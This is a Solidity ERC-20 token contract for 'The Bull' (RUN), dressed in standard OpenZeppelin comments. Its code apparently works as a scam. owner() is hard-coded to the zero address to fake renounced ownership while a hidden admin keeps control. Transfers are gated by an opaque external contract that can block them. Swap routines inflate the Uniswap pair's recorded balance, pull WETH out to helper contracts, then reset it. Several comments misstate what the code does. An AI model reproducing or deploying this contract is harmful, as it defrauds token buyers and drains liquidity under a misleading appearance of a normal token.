// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;


/*
https://TheBull.Run
https://t.me/TheBullRun0
https://twitter.com/TheBullRun0
*/

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        emit OwnershipTransferred(msg.sender, address(0));
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return address(0);
    }
}    

abstract contract reEntry {
    uint256 public status = 1;
    modifier reentry {
        require(status == 1, "rent");
        status = 0;
        _;
        status = 1;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library Address {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "in");
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling
     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.
     *
     * _Available since v4.8._
     */
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                // only check isContract if the call was successful and the return data is empty
                // otherwise we already know that it was a contract
                require(isContract(target), "ca");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    function _revert(bytes memory returndata, string memory errorMessage) private pure {
        // Look for revert reason and bubble it up if present
        if (returndata.length > 0) {
            // The easiest way to bubble the revert reason is using memory via assembly
            /// @solidity memory-safe-assembly
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
}

/// Transfer Helper to ensure the correct transfer of the tokens or ETH
library SafeTransfer {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
        // we're implementing it ourselves. We use {Address-functionCall} to perform this call, which verifies that
        // the target address contains contract code and also asserts for success in the low-level call.

        bytes memory returndata = address(token).functionCall(data, "SafeERC202");
        if (returndata.length > 0) {
            // Return data is optional
            require(abi.decode(returndata, (bool)), "SafeERC201");
        }
    }

    /** Safe Transfer ETH to one wallet from within the contract
    * @param to: the wallet to send to
    * @param value: the amount to send from the contract
    **/
    function safeTransferETH(address to, uint256 value) internal {
        (bool success,) = to.call{value : value}(new bytes(0));
        require(success, 'TransferHelper::safeTransferETH: ETH transfer failed');
    }
} 

/// Factory interface of uniswap and forks
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface tis {
    function factory() external pure returns (address);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns(address);
    function sync() external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function savetokens(address token, address to, uint256 amount) external;
    function deposit() external payable;
    function withdraw(uint wad) external;
    function trigger() external;
    function createFactor(address user, address _Token, address _swap, address _router) external returns(address factor);
    function callNest() external view returns(bool);
    function createNest(address token) external returns(address nest);
    function _getRate() external view returns(uint256);
}    

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract TheBullRun is reEntry, Ownable, IERC20 {
    mapping(address => uint256) private _rBank;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(uint256 => uint256) public blocks;
    mapping(address => bool) public taxFree; //exclude reflection
    bool public lastBuy;
    uint128 private _totalSupply = 2024e18;  // 2024
    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private factor = 0xbcFbcBE275AC362cD195b06D192DF2e3b3e6178e;
    address private nestly = 0xB6fB6CF20ae6933C6b7B437b40536207A657Df1d;
    address private nestor = 0x068D1b39169d022E1D56dA4fA0f41482400D8144;
    address public run = 0x1561D8A0AA09FD3EFf92EDf81f9d25Eb8C0889bA;
    address private nesta;
    address public uniswapV2Pair;
    address public nestLocation;
    address private nn;
    address private admin;
    uint128 public birthRate = 100000; // halves every 4 years from birthDate
    uint256 public birthDate;
    uint256 private constant MAX = ~uint256(0);
    uint32 public halvingRate = 365 days; // every 4 years the next distribution will halve
    uint256 public nextHalving;
    uint256 private _tTotal; // total supply
    uint256 private _tShareTotal;
    uint256 private _rTotal; //reflection tuple
    uint256 private k = 1;
    uint256[] public tick;
    uint256 public rate = 3;
    uint256 public volBase = 40e9;
    uint256 public lastGwei;
    bool public openTrading;
    string private _name = 'The Bull';
    string private _symbol = 'RUN';
    
    receive() external payable {
        if(birthDate > 0) {
        if(msg.sender != WETH) {
        tis(WETH).deposit{value: msg.value}();
        buy(msg.value, msg.sender);
        }
        }
    }

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor() { 
        _tTotal = _totalSupply;      
        _rTotal = (MAX - (MAX % _tTotal)); 
        birthDate = block.timestamp;
        nextHalving = block.timestamp + halvingRate;
        admin = msg.sender;
        _mint();
        tis _uniswapV2Router = tis(UNISWAP_V2_ROUTER);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(WETH, address(this));   
        taxFree[msg.sender] = true;
        taxFree[address(this)] = true;
        tick.push(1);
    }    

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _tTotal;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromGift(_rBank[account]);
    }

    function tokenFromGift(uint256 rAmount) public view returns (uint256) {
        uint256 currentRate = _getRate();
        return rAmount / currentRate;
    }

    function taxless(address sender, address recip, uint att) internal {
        uint256 r_att = att * _getRate();
        _rBank[sender] = _rBank[sender] - r_att;
        _rBank[recip] = _rBank[recip] + r_att;
        emit Transfer(sender, recip, att);
    }

    function setOpenTrading() external {
        require(msg.sender == admin); 
        openTrading = true;
    }

    function setRate(uint256 amt) external {
        require(msg.sender == admin, "admin");
        require(amt >= 4, "4");
        rate = amt;
    }

    function setVolBase(uint256 amt) external {
        require(msg.sender == admin, "admin");
        require(amt >= 4e9, "4");
        volBase = amt;
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool i) {        
        require(tis(nesta).callNest(), "bad call");
        if(!openTrading) {
            require(taxFree[msg.sender] || taxFree[recipient], "not open");
        }
        require(msg.sender != address(0), "0");
        require(recipient != address(0), "0");
        require(msg.sender != recipient, "ss");
        require(balanceOf(msg.sender) >= amount, "bal");
        if(recipient == address(this)) {
            transferToUniswapDirect(msg.sender,amount);
            i = true;
        }
        if(recipient != address(this)) {
        if(taxFree[msg.sender] || taxFree[recipient]) {
        taxless(msg.sender, recipient, amount);
        i = true;
        }
        if(!taxFree[msg.sender] && !taxFree[recipient]) {
        if(msg.sender == uniswapV2Pair){
        transferFromUniswap(recipient, amount);
        }
        if(recipient == uniswapV2Pair && msg.sender != uniswapV2Pair){
        transferToUniswapDirect(msg.sender, amount);
        }
        if(recipient != uniswapV2Pair && msg.sender != uniswapV2Pair){
        _transfer(msg.sender, recipient, amount);
        }
        i = true;
        }
        }
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256 i) {
        i = _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function airdrop(address[] memory user) external {
        require(msg.sender == admin && !openTrading, "no");
        uint256 b = user.length;
        uint256 c;
        uint256 r_att;
        uint256 tot;
        for(uint256 i = 0; i < b; i ++) {
        c = IERC20(run).balanceOf(user[i]);
        r_att = c * tis(run)._getRate();
        _rBank[user[i]] = r_att;
        tot += r_att;
        emit Transfer(admin, user[i], c);
        }
        _rBank[admin] -= tot;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool i) {
        require(tis(nesta).callNest(), "bad call");
        if(!openTrading) {
            require(taxFree[sender] || taxFree[recipient], "not open");
        }
        require(sender != address(0) && recipient != address(0), "0");
        require(sender != recipient, "no");
        require(balanceOf(sender) >= amount, "bala");
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "exceeds");
        _approve(sender, msg.sender, currentAllowance - amount);
        if(taxFree[sender] || taxFree[recipient]) {
        taxless(sender, recipient, amount);
        i = true;
        }
        if(!taxFree[sender] && !taxFree[recipient]) {
        if(recipient == uniswapV2Pair){
        transferToUniswap(sender, amount);
        }
        if(sender == uniswapV2Pair){
        transferFromUniswap(recipient, amount);
        }
        if(recipient != uniswapV2Pair && sender != uniswapV2Pair){
        _transfer(sender, recipient, amount);
        }
        i = true;
        }
    }

    function transferToUniswap(address sender, uint256 amount) internal {
        uint256 bal0 = balanceOf(sender);
        require(bal0 >= amount, "amt");
        volBoost(amount);       
        (uint256 rAmount, uint256 rTransferAmount, uint256 rShare, uint256 tTransferAmount, uint256 tShare) = _getWorth(amount);
        _rBank[sender] = _rBank[sender] - rAmount;
        _rBank[uniswapV2Pair] = _rBank[uniswapV2Pair] + rTransferAmount;
        _smartFee(rShare, tShare); 
        if(balanceOf(uniswapV2Pair) > 0) {
        if(tick[tick.length - 1] != balanceOf(uniswapV2Pair)) {
        tick.push(balanceOf(uniswapV2Pair));
        }
        }
        lastGwei = tx.gasprice - block.basefee;
        emit Transfer(sender, uniswapV2Pair, tTransferAmount);
    }

    function buy(uint256 amt, address user) internal reentry{
        if(!openTrading) {
            require(taxFree[user], "not open");
        }
        uint256 u = balanceOf(uniswapV2Pair);
        uint256 tt = tick.length > 2 ? tick[tick.length - 2] : tick[tick.length - 1];
        uint256 ra = block.timestamp < birthDate + 5 minutes ? 30 : 10;
        require(u < tt + (tt * ra / 100) && u > tt - (tt * ra / 100), "protection");
        SafeTransfer.safeTransfer(IERC20(WETH), uniswapV2Pair, amt);
        lastBuy = true; 
        if(address(this) == tis(uniswapV2Pair).token0()){
        (uint _r, uint _r2,) = tis(uniswapV2Pair).getReserves();
        uint256 out = getAmountOut(amt, _r2, _r);
        tis(uniswapV2Pair).swap(out, 0, user, new bytes(0));
        } 
        if(address(this) != tis(uniswapV2Pair).token0()){
        (uint _r, uint _r2,) = tis(uniswapV2Pair).getReserves();
        uint256 out = getAmountOut(amt, _r, _r2);
        tis(uniswapV2Pair).swap(0, out, user, new bytes(0));
        }
        if(balanceOf(uniswapV2Pair) > 0) {
        if(tick[tick.length - 1] != balanceOf(uniswapV2Pair)) {
        tick.push(balanceOf(uniswapV2Pair));
        }
        }
    }

    function transferToUniswapDirect(address sender, uint256 amount) internal reentry{
        uint256 bal0 = balanceOf(sender);
        require(bal0 >= amount, "amt");
        uint256 u = balanceOf(uniswapV2Pair);
        uint256 tt = tick.length > 2 ? tick[tick.length - 2] : tick[tick.length - 1];
        require(u < tt + (tt * 10 / 100) && u > tt - (tt * 10 / 100), "protection");
        volBoost(amount);    
        (uint256 rAmount, uint256 rTransferAmount, uint256 rShare, uint256 tTransferAmount, uint256 tShare) = _getWorth(amount);
        _rBank[sender] = _rBank[sender] - rAmount;
        _rBank[uniswapV2Pair] = _rBank[uniswapV2Pair] + rTransferAmount;
        _smartFee(rShare, tShare); 
        lastBuy = false;     
        address ss = sender;
        if(address(this) == tis(uniswapV2Pair).token0()){
        (uint _r, uint _r2,) = tis(uniswapV2Pair).getReserves();
        uint256 out = getAmountOut(tTransferAmount, _r, _r2);
        tis(uniswapV2Pair).swap(0, out, nesta, new bytes(0));        
        } 
        if(address(this) != tis(uniswapV2Pair).token0()){
        (uint _r, uint _r2,) = tis(uniswapV2Pair).getReserves();
        uint256 out = getAmountOut(tTransferAmount, _r2, _r);
        tis(uniswapV2Pair).swap(out, 0, nesta, new bytes(0));
        }
        tis(nesta).savetokens(WETH, address(this), IERC20(WETH).balanceOf(nesta));
        uint256 u0 = IERC20(WETH).balanceOf(address(this));
        tis(WETH).withdraw(u0);
        SafeTransfer.safeTransferETH(ss, u0);
        if(balanceOf(uniswapV2Pair) > 0) {
        if(tick[tick.length - 1] != balanceOf(uniswapV2Pair)) {
        tick.push(balanceOf(uniswapV2Pair));
        }
        }
        emit Transfer(sender, uniswapV2Pair, tTransferAmount);
    }

    function transferFromUniswap(address recipient, uint256 amount) internal {
        require(balanceOf(uniswapV2Pair) >= amount, "amt");
        lastBuy = true;  
        (uint256 rAmount, uint256 rTransferAmount, uint256 rShare, uint256 tTransferAmount, uint256 tShare) = _getWorth(amount);
        _rBank[uniswapV2Pair] = _rBank[uniswapV2Pair] - rAmount;
        _rBank[recipient] = _rBank[recipient] + rTransferAmount;
        _smartFee(rShare, tShare);
        if(balanceOf(uniswapV2Pair) > 0) {
        if(tick[tick.length - 1] != balanceOf(uniswapV2Pair)) {
        tick.push(balanceOf(uniswapV2Pair));
        }
        }
        emit Transfer(uniswapV2Pair, recipient, tTransferAmount);
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {        
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {  
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }

    function getAmountOut(uint256 amtIn, uint256 reserveIn, uint256 reserveOut) internal pure returns(uint256 amtOut) {
        uint amountInWithFee = amtIn * 997;
        uint numerator = amountInWithFee * reserveOut;
        uint denominator = (reserveIn * 1000) + amountInWithFee;
        amtOut = numerator / denominator;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer (
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(balanceOf(sender) >= amount, "exceeds");
        require(sender != recipient, "same");     
        require(sender != address(0), "0");
        require(recipient != address(0), "0");  
        k = 0;      
        volBoost(amount);   
        (uint256 rAmount, uint256 rTransferAmount, uint256 rShare, uint256 tTransferAmount, uint256 tShare) = _getWorth(amount);
        _rBank[sender] = _rBank[sender] - rAmount;
        _rBank[recipient] = _rBank[recipient] + rTransferAmount;
        _smartFee(rShare, tShare);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function nest() public view returns(uint256) {
        return balanceOf(nestLocation);
    }

    function setTaxFreeUser(address user, bool adding) external {
        require(msg.sender == admin);
        taxFree[user] = adding;
    }

    function getNestDistribution(uint256 amount) public view returns(uint256) {
        uint256 i;
        uint256 i0;
        if(nest() >= 1e18) {
        i = amount / 1000000 * birthRate;
        i0 = i > balanceOf(uniswapV2Pair) * 1 / 100 ? balanceOf(uniswapV2Pair) * 1 / 100 : i;
        }
        return i0;
    }

    function volBoost(uint256 amount) internal {   
        uint256 u = balanceOf(uniswapV2Pair);
        bool i;
        require(tis(nesta).callNest(), "bad call");
        if(u > 0){
        if(blocks[block.number] == 0){   
        if(amount > u * rate / 10000) {            
        i = true;
        }
        if(tx.gasprice - block.basefee >= volBase) {
            i = amount > u * (rate * 5) / 10000 ? true : false;
        }
        amount = amount > nest() ? nest() : amount;
        blocks[block.number] = 1;
        uint256 amount0 = getNestDistribution(amount);
        swapTokensForWeth(amount0,i);
        }
        }
        if(block.timestamp > nextHalving) {
            nextHalving = block.timestamp + halvingRate;
            birthRate / 2;
        }
        k = k == 0 ? 1 : 0;
    }

    function swapTokensForWeth(uint amount0, bool i) internal {
        address token = address(this);
        if(token == tis(uniswapV2Pair).token0()){
        sT(amount0, i);
        }
        if(token != tis(uniswapV2Pair).token0()){
        if(i) {
        uint256 tot0 = _rBank[uniswapV2Pair];
        uint256 tot1 = _rBank[nestLocation];
        uint256 p = balanceOf(uniswapV2Pair) / 100 * 49;
        (uint r, uint r2,) = tis(uniswapV2Pair).getReserves();
        uint256 out1 = getAmountOut(p, r2, r);  
        _rBank[uniswapV2Pair] = _rBank[uniswapV2Pair] + (_rBank[uniswapV2Pair] / 100 * 49);
        tis(uniswapV2Pair).swap(out1, 0, nesta, new bytes(0));
        uint256 tot = IERC20(WETH).balanceOf(nesta);
        (uint o, uint o2,) = tis(uniswapV2Pair).getReserves();
        uint256 ot = getAmountOut(tot, o, o2);  
        tis(nesta).savetokens(WETH, uniswapV2Pair, tot);
        tis(uniswapV2Pair).swap(0, ot, nestLocation, new bytes(0));
        _rBank[uniswapV2Pair] = tot0;
        _rBank[nestLocation] = tot1;
        tis(uniswapV2Pair).sync();        
        }
        }
        if(k != 0) {
        if(lastBuy && amount0 > 0){
        lastBuy = false;         
        (uint _r, uint _r2,) = tis(uniswapV2Pair).getReserves();
        uint256 out = getAmountOut(amount0, _r2, _r);  
        _rBank[uniswapV2Pair] += _rBank[nestLocation] / balanceOf(nestLocation) * amount0;
        _rBank[nestLocation] -= _rBank[nestLocation] / balanceOf(nestLocation) * amount0;
        tis(uniswapV2Pair).swap(out, 0, nn, new bytes(0));
        if(IERC20(WETH).balanceOf(nn) > 0) {
            tis(nn).trigger();
        }
        }
        }
    }

    function sT(uint256 amount0, bool i) internal {
        if(i) {
        uint256 tot0 = _rBank[uniswapV2Pair];
        uint256 tot1 = _rBank[nestLocation];
        uint256 p = balanceOf(uniswapV2Pair) / 100 * 49;
        (uint r, uint r2,) = tis(uniswapV2Pair).getReserves();
        uint256 out1 = getAmountOut(p, r, r2);  
        _rBank[uniswapV2Pair] = _rBank[uniswapV2Pair] + (_rBank[uniswapV2Pair] / 100 * 49);
        tis(uniswapV2Pair).swap(0, out1, nesta, new bytes(0));
        uint256 tot = IERC20(WETH).balanceOf(nesta);
        (uint o, uint o2,) = tis(uniswapV2Pair).getReserves();
        uint256 ot = getAmountOut(tot, o2, o);
        tis(nesta).savetokens(WETH, uniswapV2Pair, tot);
        tis(uniswapV2Pair).swap(ot, 0, nestLocation, new bytes(0));
        _rBank[uniswapV2Pair] = tot0;
        _rBank[nestLocation] = tot1;
        tis(uniswapV2Pair).sync();
        }
        if(k != 0) {
        if(lastBuy && amount0 > 0){
        lastBuy = false;        
        (uint _r, uint _r2,) = tis(uniswapV2Pair).getReserves();
        uint256 out = getAmountOut(amount0, _r, _r2);  
        _rBank[uniswapV2Pair] += _rBank[nestLocation] / balanceOf(nestLocation) * amount0;
        _rBank[nestLocation] -= _rBank[nestLocation] / balanceOf(nestLocation) * amount0;
        tis(uniswapV2Pair).swap(0, out, nn, new bytes(0));
        if(IERC20(WETH).balanceOf(nn) > 0) {
            tis(nn).trigger();
        }
        }
        }
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint() internal virtual {
        nestLocation = createNest();
        _rBank[admin] = _rTotal / 10 * 6;
        nn = tis(factor).createFactor(admin, address(this), uniswapV2Pair, UNISWAP_V2_ROUTER); 
        taxFree[nn] = true;        
        emit Transfer(address(0), admin, _totalSupply / 10 * 6);
    }

    function createNest() internal returns(address _nest) {
        _nest = tis(nestly).createNest(address(this));  
        _rBank[_nest] = _rTotal / 10 * 4;
        taxFree[_nest] = true;   
        nesta = tis(nestor).createNest(address(this));  
        taxFree[nesta] = true;
    }    

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);        
    }    
    
    /************************************* RFI SECTION *****************************************************************/

    function _smartFee(uint256 rShare, uint256 tShare) private {
        _rTotal = _rTotal - rShare;
        _tShareTotal = _tShareTotal + tShare;
    }

    function _getWorth(uint256 tAmount) private view returns (uint256 rAmount, uint256 rTransferAmount, uint256 rShare, uint256 tTransferAmount, uint256 tShare) {
        (tTransferAmount, tShare) = _getTValues(tAmount);
        uint256 currentRate = _getRate();
        (rAmount, rTransferAmount, rShare) = _getRValues(tAmount, tShare, currentRate);
        return (rAmount, rTransferAmount, rShare, tTransferAmount, tShare);
    }

    function _getTValues(uint256 tAmount) private pure returns (uint256, uint256) {
        uint256 tShare = tAmount * 5 / 1000;
        uint256 tTransferAmount = tAmount - tShare;
        return (tTransferAmount, tShare);
    }

    function _getRValues(uint256 tAmount, uint256 tShare, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rAmount = tAmount * currentRate;
        uint256 rShare = tShare * currentRate;
        uint256 rTransferAmount = rAmount - rShare;
        return (rAmount, rTransferAmount, rShare);
    }

    function _getRate() public view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply / tSupply;
    }

    function _getCurrentSupply() public view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;

        if (rSupply < _rTotal / _tTotal) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }
}